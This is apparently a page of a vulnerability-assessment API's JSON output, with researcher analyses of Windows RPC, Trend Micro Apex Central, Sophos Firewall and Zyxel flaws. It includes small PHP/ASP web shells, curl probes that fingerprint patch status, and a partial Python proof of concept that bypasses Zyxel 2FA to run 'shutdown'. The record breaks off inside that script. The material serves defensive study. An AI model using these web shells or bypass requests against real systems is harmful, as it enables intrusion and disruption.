{
  "links": {
    "next": {
      "href": "/v1/assessments?expand=tags&page=14&size=100&sort=created%3Aasc"
    },
    "prev": {
      "href": "/v1/assessments?expand=tags&page=12&size=100&sort=created%3Aasc"
    },
    "self": {
      "href": "/v1/assessments?expand=tags&page=13&size=100&sort=created%3Aasc"
    }
  },
  "data": [
    {
      "id": "8e95f439-4598-4c48-9161-2b45d9d18048",
      "editorId": "d8c8480d-891a-4357-a086-25351dae6598",
      "topicId": "f4bf02ae-b090-4307-89aa-47e57c92ec8f",
      "created": "2022-04-01T18:13:44.92081Z",
      "revisionDate": "2022-06-01T17:33:35.879292Z",
      "document": "It's currently difficult to assess the exact value of this vulnerability because we don't know how common the vulnerable configuration is. We might not even be aware of all the vulnerable configurations at this time. See the Rapid7 analysis for additional details.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 4,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "c5388953-da2c-4aee-a175-b81281970a3b",
      "editorId": "b68e9cb9-1bd0-4339-abe7-329618ce2467",
      "topicId": "fe828222-2db7-40a7-b8cc-e0dc3ab2a36c",
      "created": "2022-04-14T15:15:52.906167Z",
      "revisionDate": "2022-04-14T15:15:52.904906Z",
      "document": "This vulnerability is one of the three Windows RPC related issues that were fixed in Microsoft's April 2022 Patch Tuesday. Compared to [CVE-2022-24492](https://attackerkb.com/topics/3aVQ1N40gl/cve-2022-24492?referrer=blog) and [CVE-2022-24528](https://attackerkb.com/topics/1vzNGTn1qo/cve-2022-24528?referrer=blog), this one does not require user interaction. It also has the highest CVSS score ([9.8](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26809)) and severity (`Critical`). Unpatched systems that expose port 445/TCP are potentially vulnerable to Remote Code Execution. This is more likely something that would happen on an internal network, since this port is usually not exposed to the Internet (well, it should not). This bug would be very interesting for any attacker that has gained access to the internal network and needs to move laterally.\r\nAccording to this [article](https://www.akamai.com/blog/security/critical-remote-code-execution-vulnerabilities-windows-rpc-runtime), the issue seems to be an [integer overflow](https://cwe.mitre.org/data/definitions/680.html) bug. Patch diffing reveals that many calls to some kind of sanitizing function have been added. This function checks if an integer value is still in the expected range after some arithmetic operations and should avoid a potentially heap buffer overflow. These checks have been added in multiple locations, both on RPC client-side and server-side of the execution flow.\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Lateral Movement",
        "attacker-value": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        }
      ]
    },
    {
      "id": "21c54a4f-f82b-4284-98fe-c18ccbe96987",
      "editorId": "d8c8480d-891a-4357-a086-25351dae6598",
      "topicId": "bc37a1a4-5822-43a1-87b4-a42b06dc3a9d",
      "created": "2022-04-15T17:40:18.902167Z",
      "revisionDate": "2022-04-15T19:42:15.840515Z",
      "document": "On March 29, 2022, Trend Micro released a [security advisory](https://success.trendmicro.com/dcx/s/solution/000290678?language=en_US) for a remote code execution vulnerability affecting Apex Central. The vulnerability allegedly allows a remote and unauthenticated attacker to upload an arbitrary file resulting in code execution. Trend Micro assigned this vulnerability, CVE-2022-26871, a CVSSv3 score of 8.6 ([AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H&version=3.1)), which is largely inconsistent with remote code execution.\r\n\r\nOn March 31, 2022, Trend Micro updated their advisory to indicate they had observed \u201can active attempt of exploitation against this vulnerability in-the-wild \u2026 in a very limited number of instances\u201d. At this time, there are no other public reports of successful exploitation or even exploitation attempts. No public proof of concept exploit exists.\r\n\r\nWhile Trend Micro reports exploitation in the wild, widespread exploitation is unlikely. Largely because there are so few internet facing instances, that it would be a stretch to call anything affecting them widespread. Scanning for the software is hindered by the fact that requests to \u201c/\u201d do not forward to the application\u2019s login page, and instead resolves to the default IIS landing page. However, using the default SSL certificate, [Shodan](https://www.shodan.io/search?query=ssl%3A%22Trend+Micro+internal+CA%22) shows less than 100 of these are online. Also, Trend Micro reports all SaaS instances were patched on March 9, 2022 (20 days before disclosure).\r\n\r\n\r\n## Assumptions\r\n\r\nUnfortunately, the description of CVE-2022-26871 provided by Trend Micro does not contain the actual attack vector:\r\n\r\n> An arbitrary file upload vulnerability in Trend Micro Apex Central could allow an unauthenticated remote attacker to upload an arbitrary file which could lead to remote code execution.\r\n\r\nApex Central is much more than just a web server. It\u2019s composed of multiple binaries, a number of which are listening for remote connections.\r\n\r\n![prcomon](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/main/CVE-2022-26871/procmon.png)\r\n\r\nThere are two hints that the arbitrary file upload issue is in the web server though. The first is thanks to the product advertisements they\u2019ve placed in their advisory. One IPS rule specifically calls out \u201cHTTP\u201d in the name.\r\n\r\n![ad](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/main/CVE-2022-26871/ad.png)\r\n\r\nThe other hint is in the CVSSv3 vector that Trend Micro created. Every part of Apex Central is running as `NT AUTHORITY\\SYSTEM` except the web server. The web server is configured via IIS to run as `NT AUTHORITY\\NETWORK SERVICE`. I assume that Trend Micro used this lower privileged user to justify the scores of C:L and I:L.\r\n\r\nAlthough, if that is the case, that is absolutely incorrect. C:L and I:L are reserved for cases where no \u201cdirect, serious\u201d impact/loss occurs. Attacker execution as `NT AUTHORITY\\NETWORK SERVICE` is C:H and I:H as it does allow an attacker to affect \u201cdirect, serious\u201d impact/loss.This is still true even if the attacker is `NT AUTHORITY\\iusr` (see below). It is not lost on the writer that the published vector is scored 8.6 (high) and not 9.8 (critical) as it appears it should be. Of course, there may be mitigating factors to justify the lower score, but those details aren\u2019t offered anywhere in the scant advisory.\r\n\r\nAssuming the vector is the web server also leads me to assume the uploaded file is a web shell. This could be completely wrong, but Trend Micro offered no CWE or any other insight so it\u2019s a reasonable starting point. Apex Central\u2019s web content uses ASP, PHP, and compiled exe/dll cgi so there is opportunity for a webshell. However, I also assume that directory traversal is required. Some (not all) of the uploaded content will be placed in an `App_Data` directory, but executing PHP/ASP out of this path is denied.\r\n\r\n![denied](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/main/CVE-2022-26871/shell_denied.png)\r\n\r\nBut if the attacker can escape upwards, they are free to execute their webshell.\r\n\r\n![yaass](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/main/CVE-2022-26871/shell_exec.png)\r\n\r\nIt\u2019s also important to note that Apex Central is strict about file extensions. This is not a scenario in which we can upload `r7.gif` and still execute PHP. The extensions have to be correct or they won\u2019t be executed:\r\n\r\n```\r\nC:\\Users\\albinolobster>curl --insecure https://192.168.1.237/webapp/r7.gif\r\n<?php echo(exec(\"whoami\")); ?>\r\n\r\nC:\\Users\\albinolobster>curl --insecure https://192.168.1.237/webapp/r7.png\r\n<%\r\nSet rs = CreateObject(\"WScript.Shell\")\r\nSet cmd = rs.Exec(\"cmd /c whoami\")\r\no = cmd.StdOut.Readall()\r\nResponse.write(o)\r\n%>\r\n```\r\n\r\nIn summary, I assume this arbitrary upload vulnerability is a webshell upload where the attacker controls the file path (either absolutely or via path traversal) and the file extension of the created file. \r\n\r\n## Hunting for the Vulnerability\r\n\r\nWe were able to acquire two versions of on-prem Apex Central in order to hunt for CVE-2022-26871: the recently patched \u201cBuild 6016\u201d and a much older \u201cBuild 3752\u201d. The large time gap between versions does not work in our favor, but it\u2019s enough to start with. \r\n\r\nThe obvious starting point is to find the locations where file upload is allowed, but this is where things start to go off the rails. While there are *many* places that implement file upload functionality, they largely seem to require authentication. There are a couple of PHP files that allow upload via `$_FILES`, but they are strict on the file extension and don\u2019t appear to move the file out of `upload_tmp_dir` which is configured as `C:\\Program Files (x86)\\Trend Micro\\Control Manager\\PHP\\upload_tmp_dir`, a path that is outside of the webroot. Here is an example of one of the unexploitable PHP file uploads (` https://host/webapp/widget/repository/widgetPool/wp1/widgetComponent/comEEFDE/tmee/uploadfile.php`):\r\n\r\n```php\r\n<?php\r\n\r\nif(isset($_FILES['image']))\r\n{\r\n    $allowed_ext= array('jpg','jpeg','png','gif');\r\n    $file_name = $_FILES [ 'image' ] [ 'name' ] ;\r\n    $file_ext = strtolower( end(explode('.',$file_name)));\r\n    $file_size=$_FILES['image']['size'];\r\n    $file_tmp= $_FILES['image']['tmp_name'];\r\n\r\n    $type = pathinfo($file_tmp, PATHINFO_EXTENSION);\r\n    $data = file_get_contents($file_tmp);\r\n    $data = base64_encode($data);\r\n\r\n    if(in_array($file_ext,$allowed_ext) === false)\r\n    {\r\n        $error_Msg ='ext_not_valid';\r\n    }\r\n    else if($file_size > 131072)\r\n    {\r\n        $error_Msg = 'size_too_big';\r\n    }\r\n    else\r\n    {\r\n        $error_Msg = 'success';\r\n    }\r\n\r\n\r\n    $json_data = array(\"errorMsg\"=>\"\");\r\n\r\n    $json_data[\"errorMsg\"] = $error_Msg;\r\n    $json_data[\"base64\"] = $data;\r\n\r\n    $json_data = json_encode($json_data);\r\n    header(\"Content-Type: text/html; charset=utf-8\");\r\n    echo rawurlencode($json_data);\r\n}\r\n\r\n?>\r\n```\r\n\r\nApex Central is also fairly meticulous about catching directory traversal issues. In fact, the diff between the two versions that we have showed the developers introducing traversal checks in places that already had traversal checks. The image below shows `WebApp/html/suspiciousObjects/ImportFileHandler.php`. Note the original on the left already uses the `isDirectoryTraversalOrInvalidExtension` call to both check for path traversal and ensure the file extension is `csv` (ruling out exploitation), but they also add an additional traversal check on the right.\r\n\r\n![double](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/main/CVE-2022-26871/doublecheck.png)\r\n\r\nThis is actually a recurring theme throughout the code base. It\u2019s almost as if someone was assigned the task of applying additional \u201c..\u201d logic to every user controlled filename, and carried out that task whether it was needed or not (which, honestly, isn\u2019t the worst thing). Although some places really did need it. From `sCloudService.cs` (although this required authentication):\r\n\r\n![good](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/main/CVE-2022-26871/good_add.png)\r\n\r\nThe code base is also fairly good about not using attacker provided file names, and instead preferring hashes or GUID. Here is an example from YARA file upload where the name and contents are hashed to generate a new filename before the file is dropped to disk for validation by `yara.exe` (from `WebAPIIOCsUtility.NET.dll`):\r\n\r\n![namehashing](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/main/CVE-2022-26871/namehashing.png)\r\n\r\nThroughout the code base, these three conditions (unauthenticated, traversal, and file extension control) appear to be kept in check by the developers. Using the two versions we have I was unable to pinpoint a vulnerable location. It could be that our old version is too old, and we were doomed from finding the vulnerability from the beginning. Trend Micro did not say which versions, specifically, were affected so it\u2019s hard to know. It could also be that I\u2019ve overlooked the issue. Or it could be that my original assumptions were bad. Regardless, I didn\u2019t find the issue, but hopefully this is useful to someone.\r\n\r\n\r\n## Summary\r\n\r\nWhile I didn\u2019t find the vulnerability myself, nor does Trend Micro give solid information on how to identify potential exploitation, I think you can reasonably assume the following things will aid in preventing or catching exploitation:\r\n\r\n* Keep the system away from the internet.\r\n* Patch if possible.\r\n* Monitor for web shell creation in the `C:\\Program Files (x86)\\Trend Micro\\Control Manager\\WebUI\\WebApp` and it\u2019s subdirectories.\r\n* Monitor from malicious behavior originating from `w3wp.exe` (IIS Worker).\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 2,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "a7b64133-6c8f-48a7-b699-6b35b91c2b88",
      "editorId": "d8c8480d-891a-4357-a086-25351dae6598",
      "topicId": "20b41b3b-c3b7-4103-8752-4e9a011b6ca9",
      "created": "2022-04-15T19:28:39.983548Z",
      "revisionDate": "2022-07-27T16:40:47.679251Z",
      "document": "On March 25, 2022, Sophos published a critical [security advisory](https://www.sophos.com/en-us/security-advisories/sophos-sa-20220325-sfos-rce) for Sophos Firewall. The advisory details [CVE-2022-1040](https://nvd.nist.gov/vuln/detail/CVE-2022-1040), an authentication bypass issue affecting the firewall\u2019s User Portal and Webadmin web interfaces. The bypass allows a remote and unauthenticated attacker to execute arbitrary code, resulting in a CVSSv3 score of 9.8 ([AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&version=3.1)).\r\n\r\nSophos has reported this vulnerability was \u201cbeing used to target a small set of specific organizations primarily in the South Asia region.\u201d There is no other public reporting confirming attempted public exploitation of this issue. No public proof of concept currently exists.\r\n\r\nAlthough Sophos Firewall is fairly widely deployed (Shodan fingerprints [~50,000](https://www.shodan.io/search?query=title%3A%22Sophos%22+html%3A%22UserPortalLogin.js%22) instances of User Portal and [~1500](https://www.shodan.io/search?query=Location%3A+%2Fwebconsole%2Fwebpages%2Flogin.jsp) Webadmin), wide exploitation of this issue is unlikely. By default, Sophos Firewall automatically updates, and no public proof of concept exists. Both of these factors should keep exploitation down to a minimum.\r\n\r\n## The Patch\r\n\r\nSophos introduced two changes to address this vulnerability. This first was a change to `web.xml` to introduce a new filter on all requests.\r\n\r\n```sh\r\nalbinolobster@ubuntu:~$ diff -u sophos_unpatched/webconsole/WEB-INF/web.xml sophos_patched/webconsole/WEB-INF/web.xml \r\n--- sophos_unpatched/webconsole/WEB-INF/web.xml\t2022-03-28 10:57:23.841991165 -0700\r\n+++ sophos_patched/webconsole/WEB-INF/web.xml\t2022-03-28 10:41:47.757727685 -0700\r\n@@ -12,6 +12,16 @@\r\n \t</session-config>\r\n \r\n \t<filter>\r\n+        \t<filter-name>RequestCheckFilter</filter-name>\r\n+\t        <filter-class>cyberoam.sessionmanagement.RequestCheckFilter</filter-class>\r\n+\t</filter>\r\n+\r\n+\t<filter-mapping>\r\n+\t        <filter-name>RequestCheckFilter</filter-name>\r\n+\t        <url-pattern>/*</url-pattern>\r\n+\t</filter-mapping>\r\n+\r\n+\t<filter>\r\n \t\t<filter-name>SessionCheckFilter</filter-name>\r\n \t\t<filter-class>cyberoam.sessionmanagement.SessionCheckFilter</filter-class>\r\n \t</filter>\r\n```\r\n\r\nThe second change was the introduction of the new filter `RequestCheckFilter.class`. The entire class is a bit long to fit here, but the interesting part for an unauthenticated attacker follows:\r\n\r\n```java\r\nJSONObject jsonObject = null;\r\nString mode = httpRequest.getParameter(\"mode\");\r\nString operation = httpRequest.getParameter(\"operation\");\r\nString dataGridId = httpRequest.getParameter(\"datagridid\");\r\ntry {\r\n  CyberoamLogger.debug(\"RequestCheckFilter\", \"mode: \" + mode);\r\n  CyberoamLogger.debug(\"RequestCheckFilter\", \"operation: \" + operation);\r\n  CyberoamLogger.debug(\"RequestCheckFilter\", \"dataGridId: \" + dataGridId);\r\n  if (request.getParameter(\"json\") != null && mode != null) {\r\n    operation = (operation == null) ? \"0\" : operation;\r\n    dataGridId = (dataGridId == null) ? \"0\" : dataGridId;\r\n    if (ALL_SESSION_CHECK_EXEMPTED_MODES.contains(Integer.valueOf(Integer.parseInt(mode))) || \r\n      isFilterRequired(Integer.parseInt(mode), \r\n        Integer.parseInt(operation), \r\n        Integer.parseInt(dataGridId))) {\r\n      jsonObject = new JSONObject(httpRequest.getParameter(\"json\"));\r\n      if (!isvalidJSONKeys(jsonObject)) {\r\n        redirectToLogin(httpRequest, httpResponse);\r\n        return;\r\n      } \r\n    } \r\n  } else {\r\n    CyberoamLogger.debug(\"RequestCheckFilter\", \"JSON parameter not found in request payload\");\r\n  } \r\n  chain.doFilter((ServletRequest)httpRequest, (ServletResponse)httpResponse);\r\n```\r\n\r\nI\u2019m going to skip over talking about all of the mode, operation, and datagrid values as it just complicates things. Generically, this logic examines the request\u2019s HTTP parameters to determine if it needs to pass the attacker provided JSON into a method called `isValidJSONKeys`. Which looks like this:\r\n\r\n```java\r\nprivate boolean isvalidJSONKeys(JSONObject jsonObject) {\r\n    Iterator<?> jsonkeys = jsonObject.keys();\r\n    while (jsonkeys.hasNext()) {\r\n      String key = (String)jsonkeys.next();\r\n      if (!isAsciiPrintable(key)) {\r\n        CyberoamLogger.info(\"RequestCheckFilter\", \"JSON key with non-ASCII printable characters!  key = \" + key);\r\n        return false;\r\n      } \r\n    } \r\n    return true;\r\n}\r\n```\r\n\r\nThis method is obviously looping over the keys in the attacker-provided JSON and validating the keys are made up of printable ASCII characters.\r\n\r\nAn unauthenticated and remote \"attacker\" can hit this code path relatively easily with a `curl`:\r\n\r\n```\r\nalbinolobster@ubuntu:~/sophos_patched$ curl -v --insecure -H \"X-Requested-With: XMLHttpRequest\" -X POST 'https://10.0.0.19/userportal/Controller?mode=8700&operation=1&datagrid=179&json=\\{\"\ud83e\udd9e\":\"test\"\\}'\r\n*   Trying 10.0.0.19:443...\r\n* Connected to 10.0.0.19 (10.0.0.19) port 443 (#0)\r\n* ALPN, offering h2\r\n* ALPN, offering http/1.1\r\n* successfully set certificate verify locations:\r\n*  CAfile: /etc/ssl/certs/ca-certificates.crt\r\n*  CApath: /etc/ssl/certs\r\n* TLSv1.3 (OUT), TLS handshake, Client hello (1):\r\n* TLSv1.3 (IN), TLS handshake, Server hello (2):\r\n* TLSv1.2 (IN), TLS handshake, Certificate (11):\r\n* TLSv1.2 (IN), TLS handshake, Server key exchange (12):\r\n* TLSv1.2 (IN), TLS handshake, Server finished (14):\r\n* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):\r\n* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):\r\n* TLSv1.2 (OUT), TLS handshake, Finished (20):\r\n* TLSv1.2 (IN), TLS handshake, Finished (20):\r\n* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384\r\n* ALPN, server did not agree to a protocol\r\n* Server certificate:\r\n*  subject: C=NA; ST=NA; L=NA; O=NA; OU=NA; CN=Appliance_Certificate_n7Rmy46scKRgK16; emailAddress=na@example.com\r\n*  start date: Aug  1 00:00:00 2015 GMT\r\n*  expire date: Dec 31 23:59:59 2036 GMT\r\n*  issuer: C=NA; ST=NA; L=NA; O=NA; OU=NA; CN=Default_CA_n7Rmy46scKRgK16; emailAddress=na@example.com\r\n*  SSL certificate verify result: self signed certificate in certificate chain (19), continuing anyway.\r\n> POST /userportal/Controller?mode=8700&operation=1&datagrid=179&json={\"\ud83e\udd9e\":\"test\"} HTTP/1.1\r\n> Host: 10.0.0.19\r\n> User-Agent: curl/7.74.0\r\n> Accept: */*\r\n> X-Requested-With: XMLHttpRequest\r\n> \r\n* Mark bundle as not supporting multiuse\r\n< HTTP/1.1 200 OK\r\n< Date: Fri, 15 Apr 2022 14:59:50 GMT\r\n< Server: xxxx\r\n< X-Frame-Options: SAMEORIGIN\r\n< Strict-Transport-Security: max-age=31536000\r\n< X-Content-Type-Options: nosniff\r\n< Content-Length: 15\r\n< Cache-Control: max-age=2592000\r\n< Expires: Sun, 15 May 2022 14:59:50 GMT\r\n< Connection: close\r\n< \r\n{\"status\":400}\r\n* Closing connection 0\r\n* TLSv1.2 (OUT), TLS alert, close notify (256):\r\n```\r\n\r\nNote the `{\"status\":400}` response from the server. An unpatched server will respond a little differently:\r\n\r\n```\r\nalbinolobster@ubuntu:~/sophos_patched$ curl --insecure -H \"X-Requested-With: XMLHttpRequest\" -X POST 'https://10.0.0.12/userportal/Controller?mode=8700&operation=1&datagrid=179&json=\\{\"\ud83e\udd9e\":\"test\"\\}'\r\n{\"status\":\"Session Expired\"}\r\n```\r\n\r\nSince the patch induces a new response from the firewall, we can remotely detect patch status. You can try the same thing on the Webadmin interface and it too generates a slightly different response (`{\"status\":\"-2\"}` when unpatched).\r\n\r\nFinally, it might be useful to know that exploitation attempts on a patched server generate the following log in `/log/tomcat.log`.\r\n\r\n```\r\n2022-04-15 15:59:50,877:INFO:RequestCheckFilter - URI: /userportal/Controller\r\n2022-04-15 15:59:50,877:INFO:RequestCheckFilter - JSON key with non-ASCII printable characters!  key = \ud83e\udd9e\r\n```\r\n\r\n## Summary\r\n\r\nIn order to address CVE-2022-1040, Sophos introduced a fairly small patch to filter the JSON content of some HTTP requests. Exploitation attempts will have non-ascii characters in the request\u2019s `json` parameter\u2019s JSON keys. If your Sophos Firewall is internet facing, it should absolutely have automatic update enabled (the default behavior). If you are in a situation where you can\u2019t do that, you likely shouldn\u2019t be using the internet facing features.\r\n",
      "score": 4,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 2,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "7e117c00-fef2-4fc7-875e-23441e4b782d",
      "editorId": "d8c8480d-891a-4357-a086-25351dae6598",
      "topicId": "7376cdcf-1933-4309-b148-310447c2ee97",
      "created": "2022-04-18T12:47:19.979104Z",
      "revisionDate": "2022-08-15T06:24:50.004352Z",
      "document": "On March 29, 2022, Zyxel released a [security advisory](https://www.zyxel.com/support/Zyxel-security-advisory-for-authentication-bypass-vulnerability-of-firewalls.shtml) for an authentication bypass vulnerability affecting a handful of their firewall and VPN products. The vulnerability, assigned [CVE-2022-0342](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0342), is described as allowing a remote attacker to obtain administrative access to the system, and was assigned a CVSSv3 score of 9.8 ([AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&version=3.1)).\r\n\r\nWe believe widespread exploitation of this issue is unlikely. While there are a fair number of affected firewalls visible on [Shodan](https://www.shodan.io/search?query=html%3A%22zyFunction.js%22), our analysis suggests that exploitation requires a specific configuration and partial authentication. Most firewalls will not be affected. There are currently no reports of this vulnerability being exploited in the wild, and, before this write-up, no public proof of concept existed.\r\n\r\n## Analysis\r\n\r\nThe most obvious change in Zyxel\u2019s patch was this modification of the web server\u2019s apache configuration file:\r\n\r\n```\r\ndiff -u ~/Downloads/5.20-ABUH.0/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/httpd.conf ~/Downloads/5.21-ABUH.1/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/httpd.conf \r\n--- /home/albinolobster/Downloads/5.20-ABUH.0/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/httpd.conf\t2022-01-04 01:24:55.000000000 -0800\r\n+++ /home/albinolobster/Downloads/5.21-ABUH.1/_compress.img.extracted/squashfs-root/usr/local/zyxel-gui/httpd.conf\t2022-03-14 13:26:04.000000000 -0700\r\n@@ -24,7 +24,8 @@\r\n AuthZyxelRedirect /\r\n AuthZyxelSkipPattern /images/ /lib/ /mobile/ /weblogin.cgi /admin.cgi /login.cgi /error.cgi /redirect.cgi /I18N.js /language /logo/ /ext-js/web-pages/login/no_granted.html /ssltun.jar /sslapp.jar /VncViewer.jar /Forwarder.jar /eps.jar /css/ /sdwan_intro.html /sdwan_intro_video.html /videos/ /webauth_error.cgi /webauth_relogin.cgi /SSHTermApplet-jdk1.3.1-dependencies-signed.jar /SSHTermApplet-jdkbug-workaround-signed.jar /SSHTermApplet-signed.jar /commons-logging.properties /org.apache.commons.logging.LogFactory /fetch_ap_info.cgi /agree.cgi /walled_garden.cgi /payment_transaction.cgi /paypal_pdt.cgi /redirect_pdt.cgi /securepay.cgi /authorize_dot_net.cgi /payment_failed.cgi /customize/ /multi-portal/ /free_time.cgi /free_time_redirect.cgi /free_time_transaction.cgi /free_time_failed.cgi /js/ /terms_of_service.html /dynamic_script.cgi /ext-js/ext/ext-all.js /ext-js/ext/adapter/ext/ext-base.js /ext-js/ext/resources/css/ext-all.css /ext-js/app/common/zyFunction.js /ext-js/app/common/zld_product_spec.js /cf_hdf_blockpage.cgi \\\r\n /libcdr_blockpage.cgi \\\r\n-/cdr_cloud_block_page.html \\\r\n+/libcdr_blockpage.html \\\r\n+/libcdr_cloud_blockpage.html \\\r\n /2FA-access.cgi \\\r\n /webauth_ga.cgi \\\r\n /fbwifi_error.cgi /fbwifi/ \\\r\n@@ -40,6 +41,8 @@\r\n /ztp/ /ztp/cgi-bin/ \\\r\n /change-expired-password.html /chg_exp_pwd.cgi ext-js/web-pages/login/chgpw_expired.html /ext-all.css /ext-all.js /appLite.js zld_product_spec.js /showCLI.js /zyVType.js /persist-min.js /zyExtend.js /zyFunction.js /zyComponent.js /language_panel.js /ext-lang-en.js /language.js /login.css /custmiz_page.js /chgpw_expired.js /retrieveData.js /MultiSelect.js /ItemSelector.js /cmdStore.js /favicon.ico /PagingStore.js /zyform.js /ext-theme-classic-all.css /content_line.gif /content_bg.jpg /login_img.gif /login_bg.jpg /advance_bg.gif /reset.css \\\r\n \r\n+AuthZyxelSkipTwoFaPattern /ext-js/app/view/object/authmeth/twoFA/2FAVerify.html /ext-js/ext/ux/grid/FiltersFeature.js /ext-js/app/view/object/authmeth/twoFA/2FAVerify.js /ext-js/ext/ux/form/field/BoxSelect/BoxSelect.js /ext-js/ext/ux/toggleslide/ToggleSlide.js /ext-js/ext/ux/toggleslide/Thumb.js /ext-js/ext/ux/grid/menu/ListMenu.js /ext-js/ext/ux/grid/menu/RangeMenu.js /ext-js/ext/ux/grid/filter/DateFilter.js /ext-js/ext/ux/grid/filter/BooleanFilter.js /ext-js/ext/ux/grid/filter/DateTimeFilter.js /ext-js/ext/ux/grid/filter/ListFilter.js /ext-js/ext/ux/grid/filter/NumericFilter.js /ext-js/ext/ux/grid/filter/StringFilter.js /ext-js/ext/ux/grid/filter/Filter.js /ext-js/ext/src/zy2FAVerifyForm.js /cgi-bin/zysh-cgi \\\r\n+\r\n ScriptAlias /cgi-bin/ \"/usr/local/apache/cgi-bin/\"\r\n \r\n AddHandler cgi-script .cgi .py\r\n```\r\n\r\nThis change introduces a second level of authentication for when two-factor authentication (2fa) is used. Corresponding changes can be found in Zyxel\u2019s custom Apache module `mod_auth_zyxel.so` and the Zyxel command line shell cgi `zysh-cgi`. \r\n\r\nZyxel\u2019s firewalls support 2fa on the administrative web interface via Google Authenticator. Like most 2fa  systems, the admin user must first correctly enter their username and password before being prompted for a 2fa verification code:\r\n\r\n![2fa](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/main/CVE-2022-0342/2fa.png)\r\n\r\nOn Zyxel\u2019s firewalls affected by CVE-2022-0342, the admin user can execute Zyxel shell commands by sending HTTP POST requests to `/cgi-bin/zysh-cgi` **without** completing the 2fa verification. The following proof of concept demonstrates this by logging in as the admin user and ignoring the 2fa redirect. The script sends POST requests to execute the Zyxel shell commands `show version` and  `shutdown`.\r\n\r\n```python\r\nimport requests\r\nfrom urllib3.exceptions import InsecureRequestWarning\r\n\r\nrequests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)\r\n\r\n# Use session since the initial login will give us an auth-tok\r\nsess = requests.Session()\r\n\r\nlogin_url = 'https://192.168.1.1/'\r\nlogin_data = { 'username':'admin','pwd':'labpass1','password':'labpass1','pwd_r':'','mp_idx':0 }\r\nheaders = { 'Origin':login_url,'Referer':login_url }\r\nresp = sess.post(login_url, data = login_data, headers=headers, allow_redirects=False, verify=False)\r\n\r\nif resp.status_code != 302:\r\n    print('Unexpected status code')\r\n    exit(0)\r\n\r\nprint(resp.headers)\r\nprint(resp.text)\r\n\r\n# Just start issuing commands :shrug:\r\nshell_url = 'https://192.168.1.1/cgi-bin/zysh-cgi'\r\nshell_data = { 'filter':'js2','cmd':'show version','write':0 }\r\nresp = sess.post(shell_url, data = shell_data, headers=headers, allow_redirects=False, verify=False)\r\n\r\nprint(resp.headers)\r\nprint(resp.text)\r\n\r\n# Shut 'em down\r\nshell_url = 